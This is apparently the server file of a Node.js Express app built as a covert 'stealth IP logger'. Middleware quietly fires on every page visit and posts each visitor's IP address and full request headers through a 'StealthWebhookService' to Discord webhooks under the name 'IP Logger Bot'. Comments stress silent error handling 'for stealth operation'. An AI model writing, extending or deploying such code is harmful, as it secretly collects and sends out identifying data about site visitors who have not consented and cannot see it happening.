// Load environment variables (works with Vercel env vars)
try {
  if (process.env.NODE_ENV !== 'production') {
    require('dotenv').config({ path: './token.env' });
  }
} catch (error) {
  console.error('❌ Failed to load environment variables:', error.message);
}

// Debug environment variables
console.log('🔧 Environment Debug:');
console.log('NODE_ENV:', process.env.NODE_ENV);
console.log('DISCORD_BOT_TOKEN:', process.env.DISCORD_BOT_TOKEN ? 'SET' : 'NOT SET');
console.log('DISCORD_CHANNEL_ID:', process.env.DISCORD_CHANNEL_ID ? 'SET' : 'NOT SET');
console.log('WEBSITE_NAME:', process.env.WEBSITE_NAME);
console.log('WEBHOOK_COUNT:', process.env.WEBHOOK_COUNT);
console.log('ENABLE_BOT:', process.env.ENABLE_BOT);

// Check for required environment variables
const requiredEnvVars = ['DISCORD_BOT_TOKEN', 'DISCORD_CHANNEL_ID'];
const missingVars = requiredEnvVars.filter(varName => !process.env[varName]);
if (missingVars.length > 0) {
  console.error('❌ Missing required environment variables:', missingVars);
}

const express = require('express');
const cors = require('cors');
const path = require('path');
const fetch = require('node-fetch');

// Import the stealth webhook service
let StealthWebhookService;
try {
  StealthWebhookService = require('./api/stealthWebhookService');
  console.log('✅ StealthWebhookService loaded successfully');
} catch (error) {
  console.error('❌ Failed to load StealthWebhookService:', error.message);
  process.exit(1);
}

// Import bot keepalive
let BotKeepAlive;
try {
  BotKeepAlive = require('./bot-keepalive');
  console.log('✅ BotKeepAlive loaded successfully');
} catch (error) {
  console.error('❌ Failed to load BotKeepAlive:', error.message);
}

const app = express();
const PORT = process.env.PORT || 3000;

// Initialize webhook service
let webhookService;
try {
  webhookService = new StealthWebhookService();
  console.log('✅ WebhookService initialized successfully');
} catch (error) {
  console.error('❌ Failed to initialize WebhookService:', error.message);
  process.exit(1);
}

// Debug webhook service
console.log('🔗 Webhook Service Debug:');
console.log('Webhook count loaded:', webhookService.webhooks.length);
console.log('First webhook URL:', webhookService.webhooks[0]?.url ? 'SET' : 'NOT SET');
if (webhookService.webhooks.length === 0) {
  console.error('❌ No webhooks loaded! Check WEBHOOK_URL_1 through WEBHOOK_URL_13');
}

// CORS configuration
app.use(cors({
  origin: true,
  credentials: true
}));

// Security headers middleware
const addSecurityHeaders = (req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  next();
};

app.use(addSecurityHeaders);

// Serve static files
app.use(express.static(path.join(__dirname, 'dist')));

// Body parsing middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Stealth IP logging endpoint
app.post('/api/stealth/log', async (req, res) => {
  console.log('🚨 Stealth log endpoint called');
  console.log('Client IP:', req.headers['x-forwarded-for'] || req.ip || 'unknown');
  console.log('Request headers:', JSON.stringify(req.headers, null, 2));
  
  try {
    if (!webhookService) {
      throw new Error('WebhookService not initialized');
    }
    
    if (webhookService.webhooks.length === 0) {
      throw new Error('No webhooks available');
    }
    
    const payload = {
      content: "🚨 **New Visitor Detected** 🚨",
      username: "IP Logger Bot",
      avatar_url: "https://cdn.discordapp.com/attachments/123456789/987654321/logo.png"
    };

    console.log('📤 Sending webhook message...');
    console.log('📤 Payload:', JSON.stringify(payload, null, 2));
    
    const result = await webhookService.sendMessage(payload, req);
    console.log('✅ Webhook sent successfully:', result);
    res.status(200).json({ success: true, result });
  } catch (error) {
    console.error('❌ Webhook error:', error.message);
    console.error('❌ Error stack:', error.stack);
    console.error('❌ Webhook service state:', {
      initialized: !!webhookService,
      webhookCount: webhookService?.webhooks?.length || 0
    });
    // Silent error handling for stealth operation
    res.status(200).json({ success: false, error: error.message });
  }
});

// Middleware to log all requests for IP tracking
app.use((req, res, next) => {
  try {
    // Skip logging for static files and API health checks
    if (req.path.startsWith('/api/webhook/health') || 
        req.path.startsWith('/static/') || 
        req.path.includes('.')) {
      return next();
    }
    
    console.log('👤 Visitor detected:', req.path);
    console.log('IP:', req.headers['x-forwarded-for'] || req.ip || 'unknown');
    console.log('User-Agent:', req.headers['user-agent'] || 'Unknown');
    
    // Log visitor IP asynchronously (don't block the request)
    setTimeout(async () => {
      try {
        console.log('🔄 Calling stealth log endpoint...');
        const host = req.get('host') || 'localhost:3000';
        const protocol = req.protocol || 'http';
        const stealthUrl = `${protocol}://${host}/api/stealth/log`;
        
        console.log('📡 Stealth URL:', stealthUrl);
        
        const response = await fetch(stealthUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': req.headers['user-agent'] || 'Unknown'
          },
          body: JSON.stringify({})
        });
        
        console.log('📡 Stealth log response status:', response.status);
        if (!response.ok) {
          const errorText = await response.text();
          console.error('❌ Stealth log response error:', errorText);
        }
        // Silent operation - no logging
      } catch (error) {
        console.error('❌ Stealth log error:', error.message);
        console.error('❌ Error stack:', error.stack);
        // Silent error handling for stealth operation
      }
    }, 0);
    
    next();
  } catch (error) {
    console.error('❌ Middleware error:', error.message);
    next();
  }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  try {
    const health = {
      status: 'healthy',
      timestamp: new Date().toISOString(),
      environment: process.env.NODE_ENV || 'development',
      webhookCount: webhookService?.webhooks?.length || 0,
      botToken: process.env.DISCORD_BOT_TOKEN ? 'SET' : 'NOT SET',
      channelId: process.env.DISCORD_CHANNEL_ID ? 'SET' : 'NOT SET',
      enableBot: process.env.ENABLE_BOT,
      webhookService: !!webhookService,
      webhookUrls: webhookService?.webhooks?.map(w => w.url ? 'SET' : 'NOT SET') || []
    };
    
    console.log('🏥 Health check:', health);
    res.json(health);
  } catch (error) {
    console.error('❌ Health check error:', error.message);
    res.status(500).json({ 
      status: 'error', 
      error: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

// Simple test endpoint
app.get('/api/test', (req, res) => {
  res.json({
    message: 'Server is working!',
    timestamp: new Date().toISOString(),
    webhooks: webhookService.webhooks.length
  });
});

// Test webhook endpoint (for debugging)
app.post('/api/test-webhook', async (req, res) => {
  console.log('🧪 Test webhook endpoint called');
  
  try {
    if (!webhookService) {
      throw new Error('WebhookService not initialized');
    }
    
    if (webhookService.webhooks.length === 0) {
      throw new Error('No webhooks available');
    }
    
    const payload = {
      content: "🧪 **Test Message** 🧪\n\n✅ Webhook system is working!\n🕒 Test timestamp: " + new Date().toISOString(),
      username: "IP Logger Test Bot",
      avatar_url: "https://cdn.discordapp.com/attachments/123456789/987654321/test.png"
    };

    console.log('📤 Sending test webhook...');
    const result = await webhookService.sendMessage(payload, req);
    console.log('✅ Test webhook sent successfully:', result);
    res.json({ success: true, result });
  } catch (error) {
    console.error('❌ Test webhook error:', error.message);
    console.error('❌ Error stack:', error.stack);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Catch-all route for SPA
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'dist', 'index.html'));
});

// Start server and bot
const startServer = async () => {
  try {
    console.log('🚀 Starting server...');
    console.log('🔧 Server configuration:', {
      port: PORT,
      environment: process.env.NODE_ENV || 'development',
      webhookCount: webhookService?.webhooks?.length || 0
    });
    
    // Start the server
    app.listen(PORT, () => {
      console.log(`🚀 Server running on port ${PORT}`);
      console.log(`🌐 Environment: ${process.env.NODE_ENV || 'development'}`);
      console.log(`🔗 Webhook count: ${webhookService?.webhooks?.length || 0}`);
      console.log(`🔗 Available endpoints:`);
      console.log(`   - GET /api/health`);
      console.log(`   - GET /api/test`);
      console.log(`   - POST /api/test-webhook`);
      console.log(`   - POST /api/stealth/log`);
    });

    // Start Discord bot (only in production or if explicitly enabled)
    if (process.env.NODE_ENV === 'production' || process.env.ENABLE_BOT === 'true') {
      console.log('🤖 Attempting to start Discord bot...');
      
      if (!BotKeepAlive) {
        console.error('❌ BotKeepAlive not loaded, skipping bot startup');
        return;
      }
      
      if (!process.env.DISCORD_BOT_TOKEN) {
        console.error('❌ DISCORD_BOT_TOKEN not set, skipping bot startup');
        return;
      }
      
      try {
        const bot = new BotKeepAlive();
        console.log('🤖 BotKeepAlive instance created');
        
        await bot.start();
        console.log('🤖 Discord bot started successfully');
      } catch (botError) {
        console.error('❌ Failed to start Discord bot:', botError.message);
        console.error('❌ Bot error stack:', botError.stack);
      }
    } else {
      console.log('🤖 Discord bot disabled (not in production mode)');
      console.log('🤖 Set ENABLE_BOT=true to enable bot in development');
    }

  } catch (error) {
    console.error('❌ Failed to start server:', error.message);
    console.error('❌ Server error stack:', error.stack);
    process.exit(1);
  }
};

// Handle graceful shutdown
process.on('SIGINT', () => {
  console.log('🛑 Shutting down gracefully...');
  process.exit(0);
});

process.on('SIGTERM', () => {
  console.log('🛑 Shutting down gracefully...');
  process.exit(0);
});

// Start the server
startServer(); 